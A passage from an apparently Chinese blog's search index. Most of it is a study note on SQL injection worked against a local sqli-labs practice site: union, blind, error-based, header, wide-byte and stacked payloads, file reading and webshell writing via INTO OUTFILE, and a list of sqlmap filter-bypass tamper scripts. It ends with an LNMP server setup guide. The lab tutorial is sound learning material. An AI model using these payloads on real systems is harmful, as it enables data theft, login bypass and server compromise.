http://www.lijiejie.com/dns-zone-transfer-1/ https://vulhub.org/#/docs/ https://segmentfault.com/a/1190000020178836 https://segmentfault.com/a/1190000006879700 https://segmentfault.com/a/1190000019263330 https://segmentfault.com/a/1190000006689767]]></content>
  </entry>
  <entry>
    <title><![CDATA[sql注入的payload]]></title>
    <url>%2F2019%2F09%2F01%2Fsql%E6%B3%A8%E5%85%A5%E7%9A%84payload%2F</url>
    <content type="text"><![CDATA[学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap ​ 内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中包含了敏感信息 ▲联合查询的类型▲堆查询注入 回显注入：利用注入漏洞可以改变页面返回数据 ▲SQL 盲注•基于布尔 SQL 盲注 通过条件是否成立来判断substr截取第一个字符判断是否大于’a’，成立则页面返回数据 •基于时间的 SQL 盲注通过返回时间的长短判断 获取第一个字符的ascii码，判断是否大于115，不成立延时5秒返回 •基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的基于程度和顺序的注入(哪里发生了影响)★一阶注射★二阶注射一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间接的对 WEB 产生危害， 这样的就被称为是二阶注入. 基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射） 以上就是通常分类，先记录下，通过后面的实验练习加深理解 2、系统函数介绍几个常用函数： version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本 3、字符串连接函数 concat(str1,str2,…)——没有分隔符地连接字符串 concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 以上三个函数能一次性查出所有信息 . 4、一般用于尝试的语句 Ps:–+可以用#替换， url 提交过程中 Url 编码后的#为%23 or 1=1–+‘or 1=1–+“or 1=1–+)or 1=1–+‘)or 1=1–+“) or 1=1–+“))or 1=1–+ 一般的代码为：$id=$_GET[‘id’];$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点， 一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ， 一般采用两种思 路， 闭合后面的引号或者注释掉， 注释掉采用–+ 或者 #（%23） 5、union 操作符的介绍UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 请注意， UNION 内部的 SELECT语句必须拥有相同数量的列。 列也必须拥有相似的数据类型。 同时， 每条 SELECT 语句中的列的顺序必须相同。 SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2注释： 默认地， UNION 操作符选取不同的值。 如果允许重复的值， 请使用 UNION ALL。 另外， UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 6 、sql 中的逻辑运算万能密码： 正常 Select * from admin where username=’ admin’ and password=’ admin’ 密码：’ or 1=1# Select * from admin where username=’ admin’ and password=’ ’ or 1=1# where 子 句后有 三 个 条 件 语 句 ==username=’ admin’ andpassword=’ ’ or 1=1，在sql 中and 运算优先级大于or的运算优先级，结果恒为真。 7、 注入流程 数据库存储的数据形式如上图，注入的过程就是先拿到数据库名，再获取当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据 Mysql 有一个系统数据库 information_schema， 存储着所有的数据库的相关信息， 一般的，我们利用该表可以进行一次完整的注入。 以下为一般的流程 ： 猜数据库 ： 猜某库的数据表 ： select table_name from information_schema.tables where table_schema=’dvwa’ 猜某表的所有列 select column_name from information_schema.columns where table_name=’users’ 获取某列的内容 select * from 表名； 第部分：实验演示联合查询的类型 payload：-1’union select 1,group_concat(schema_name),3 from information_schema.schemata –+ 1、group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 2、union 联合注入， union 的作用是将两个 sql 语句进行联合， union 前后的两个 sql 语句的选择列数要相同才可以。 Union all 与 union 的区别是增加了去重的功能 3、当 id 的数据在数据库中不存在时， id=-1， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空，就将后面的语句的内容显示出来，此处前台页面返回了我们构造的 union 的数据 4、此处利用 order by 对前面的数据进行排序， 这里有三列数据， 我们就只能用order by 3,超过 3 就会报错。‘order by 4–+的结果显示结果超出。 盲注盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息到前端页面。 盲注可以分为三类： •基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 1： 基于布尔 SQL 盲注-构造逻辑判断 截取字符串相关函数解析 ▲left(database(),1)&gt;’ s’ //left()函数 Explain:database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位 ▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+ //substr()函数， ascii()函数 Explain： substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度。 Ascii()将某个字符转换为 ascii 值 ▲ascii(substr((select database()),1,1))=98 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数， MID()函数 Explain： mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位Ord()函数同 ascii()， 将字符转为 ascii 值 ▲regexp 正则注入 存疑正则注入介绍用法介绍： select user() regexp ‘^[a-z]’;Explain： 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。 ▲like 匹配注入 和上述的正则类似， mysql 在匹配的时候我们可以用 ike 进行匹配。用法： select user() like ‘ro% 2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来 存疑▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性， 此处重复了 version， 所以报错。 3:基于时间的 SQL 盲注–延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep IF表达式 1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 布尔盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39;and left(version(),1)=5# 1） 利用 left(database(),1)进行尝试 查看 version()， 数据库的版本号为 10.1.36, 这句话的意思是查看版本号第一位是不是1， 明显的返回的结果是正确的 当版本号不正确的时候， 则不能正确显示 you are in…… http://127.0.0.1/sqllib/Less-5/?id=1 ‘and length(database())=8 –+ 判读数据库长度 猜测数据库第一位 继而猜测第二位 采用二分法 报错盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39; union Select 1,count(),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)2))a from information_schema.columns group by a–+ 利用 double 数值类型超出范围进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3–+ 利用 bigint 溢出进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (!(select * from (select user())x) - ~0),2,3--+ xpath 函数报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+ http://127.0.0.1/sqllib/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)–+ 利用数据的重复性http://127.0.0.1/sqllib/Less-5/?id=1&#39;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+ 演示盲注演示http://127.0.0.1/sqllib/Less-5/?id=1’and if(ascii(substr(database(),1,1))=116,1,sleep(5))–+ 当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入 当结果正确的时候， 运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次， 会占用一段时间。 http://127.0.0.1/sqllib/Less-5/?id=1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+ 猜数据库： http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 说明第一位是 s （ascii 码是 115） http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第二位是 e （ascii 码是 101） 以此类推 猜出数据的名字是security 猜测 security 的数据表：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+猜测第一个数据表的第一位是 e,…依次类推， 得到 emails http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+猜测第二个数据表的第一位是 r,…依次类推， 得到 referers 以此类推， 我们可以得到所有的数据表 emails,referers,uagents,users 猜测users表的列 http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from informationschema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+猜测 users 表的第一个列的第一个字符是 i，以此类推， 我们得到列名是 id， username， password 猜测 username 的值：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+猜测 username 的第一行的第一位以此类推， 我们得到数据库 username， password 的所有内容 文件的导入导出1、 load_file()导出文件Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。使用条件：A、 必须有权限读取并且文件必须完全可读and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。and (select count() from mysql.user)&gt;0/ 返回错误， 应该是管理员给数据库帐户降权B、 欲读取文件必须在服务器上C、 必须指定文件完整的路径Mysql 注入—sqlilabs—lcamry30D、 欲读取文件必须小于 max_allowed_packet如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有administrators 才能访问的文件， users 就别想 load_file 出来。在实际的注入中， 我们有两个难点需要解决：绝对物理路径构造有效的畸形语句 （报错爆出绝对路径）在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务器的安全将受到严重的威胁。常用路径：http://www.cnblogs.com/lcamry/p/5729087.html示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\boot.ini)Explain:路径里的/用 \代替 2、 文件导入到数据库LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行， 并装入一个表中。 文件名称必须为一个文字字符串。 在注入过程中， 我们往往需要一些特殊的文件， 比如配置文件， 密码文件等。 当你具有数据库的权限时， 可以将系统文件利用 load data infile 导入到数据库中。 示例： load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’lines terminated by ‘\n’ 将/tmp/t0.txt 导入到 t0 表中， character set gbk 是字符集设置为 gbk， fields terminated by 是每一项数据之间的分隔符， lines terminated by 是行的结尾符。 当错误代码是 2 的时候的时候， 文件不存在， 错误代码为 13 的时候是没有权限， 可以考虑/tmp 等文件夹。 3、 导入到文件SELECT…..INTO OUTFILE ‘file_name’ 可以把被选择的行写入一个文件中。 该文件被创建到服务器主机上， 因此您必须拥有 FILE权限， 才能使用此语法。 file_name 不能是一个已经存在的文件。 有两种形式： 第一种直接将 select 内容导入到文件中： Select version() into outfile “c:\phpnow\htdocs\test.php”此处将 version()替换成一句话， 也即Select into outfile “c:\phpnow\htdocs\test.php” 然后直接连一句话 第二种修改文件结尾：Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件 解释： 通常是用‘\r\n’ 结尾， 此处我们修改为自己想要的任何文件。 同时可以用 FIELDSTERMINATED BY16 进制可以为一句话或者其他任何的代码， 可自行构造。 在 sqlmap 中 os-shell 采取的就是这样的方式， 具体可参考 os-shell 分析文章： http://www.cnblogs.com/lcamry/p/5505110.html http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,3 into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.txt” –+ 写入一句话木马 http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,’‘ into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.php” –+ 后续就可以上菜刀了 POST 注入输入正确用户名和密码 提交 username 和 password 后， 后台形成的 sql 语句为 $sql=”SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1”; 万能密码: 用户名：admin’or’1’=’1# admin ‘ # 密码：密码随便输入 $sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and password=’$passwd’ LIMIT 0,1”; 猜测数据库第一位 uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit 增删改函数介绍 增加一行数据 INSERT insert into users values(‘16’,’lcamry’,’lcamry’); 删除一行数据 ​ 修改一行数据 updata 表名 set 列名=’新的值， 非数字加单引号’ where id=6; HTTP 头部注入User-Agent 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1 Referer 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 cookie 注入 报错了 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 二次排序什么是二次排序：二次排序注入也成为存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出触发sql 注入。 二次排序注入思路： 黑客通过构造数据的形式， 在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理， 提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。 黑客向服务端发送第二个与第一次不相同的请求数据信息。 服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。 注册用户名为admin’# 密码为123的账号 登录用户名 admi’# 并修改密码 可以看到admin 密码被修改了 Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ ANDpassword=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’admin’ 利用注册的admin’# 修改密码时候从数据库提取该数据 造成了数据 命令拼接 宽字节注入mysql 在使用 GBK 编码的时候， 会认为两个字符为一个汉字， 例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围） 。 我们在过滤 ’ 的时候， 往往利用的思路是将 ‘ 转换为 \’ 1、 %df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27， 我们在%5c%27 前面添加%df， 形成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。2、 将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。 这也是 bypass 的一种方法。 get 型的方式我们是以 url 形式提交的， 因此数据会通过 URLencode post 型的注入当中， 将 utf-8 转换为 utf-16 或 utf-32， 例如将 ‘ 转为 utf-16 为 � ‘ 堆叠注入1、在 SQL 中， 分号（;） 是用来表示一条 sql 语句的结束。 2、在 ; 结束一个 sql语句后继续构造下一条语句就造就了堆叠注入。 3、与union injection（联合注入）的 区别就在于 union或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠 注入可以执行的是任意的语句 堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用 union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表名， 列名等信息 PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符。 堆叠注入payload： http://127.0.0.1/sqli-labs/Less-38/index.php?id=1%27;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–+ Tamper详解原始注入遇到困难时，可尝试加载相应脚本，进行绕过用法： –tamper**“脚本名称”(可使用多个tamper) sqlmap版本1.2.7.20，共有57个tamper脚本 序号 脚本名称 注释 1 0x2char 将每个编码后的字符转换为等价表达 2 apostrophemask 单引号替换为Utf8字符，用于过滤单引号 3 apostrophenullencode 替换双引号为%00%27 4 appendnullbyte 有效代码后添加%00 5 base64encode 使用base64编码 6 between 比较符替换为between 7 bluecoat 空格替换为随机空白字符，等号替换为like 8 chardoubleencode 双url编码 9 charencode 将url编码(不处理已经编码的字符) 10 charunicodeencode 使用unicode编码 11 charunicodeescape 以指定的payload反向编码未编码的字符 12 commalesslimit 改变limit语句的写法 13 commalessmid 改变mid语句的写法 14 commentbeforeparentheses 在括号前加内联注释 15 concat2concatws 替换CONCAT为CONCAT_WS 16 equaltolike 等号替换为like 17 escapequotes 双引号替换为\ 18 greatest 大于号替换为greatest，绕过对&gt;的过滤 19 halfversionedmorekeywords 在每个关键字前加注释 20 htmlencode html编码所有非字母和数字的字符 21 ifnull2casewhenisnull 改变ifnull语句的写法 22 ifnull2ifisnull 替换ifnull为if(isnull(A)) 23 informationschemacomment 标示符后添加注释 24 least 替换大于号为least 25 lowercase 全部替换为小写值 26 modsecurityversioned 空格替换为查询版本的注释 27 modsecurityzeroversioned 添加完整的查询版本的注释 28 multiplespaces 添加多个空格 29 nonrecursivereplacement 替换预定义的关键字 30 overlongutf8 将所有字符转义为utf8 31 overlongutf8more 以指定的payload转换所有字符 32 percentage 每个字符前添加% 33 plus2concat 将加号替换为concat函数 34 plus2fnconcat 将加号替换为ODBC函数{fn CONCAT()} 35 randomcase 字符大小写随机替换 36 randomcomments /**/分割关键字 37 securesphere 添加某字符串 38 sp_password 追加sp_password字符串 39 space2comment 空格替换为/**/ 40 space2dash 空格替换为–加随机字符 41 space2hash 空格替换为#加随机字符 42 space2morecomment 空格替换为/_/ 43 space2morehash 空格替换为#加随机字符及换行符 44 space2mssqlblank 空格替换为其他空符号 45 space2mssqlhash 空格替换为%23%0A 46 space2mysqlblank 空格替换为其他空白符号 47 space2mysqldash 空格替换为–%0A 48 space2plus 空格替换为加号 49 space2randomblank 空格替换为备选字符集中的随机字符 50 symboliclogical AND和OR替换为&amp;&amp;和\ \ 51 unionalltounion union all select替换为union select 52 unmagicquotes 宽字符绕过GPC 53 uppercase 全部替换为大写值 54 varnish 添加HTTP头 55 versionedkeywords 用注释封装每个非函数的关键字 56 versionedmorekeywords 使用注释绕过 57 xforwardedfor 添加伪造的HTTP头 脚本base64encode.py内容 –dbs –base64encode.py 参考资料：SQL注入回顾篇(四)/#权限常用参数 sqli-SQL注入总结]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2FLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建Ubuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择 最小安装 格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证]]></content>
  </entry>
</search>
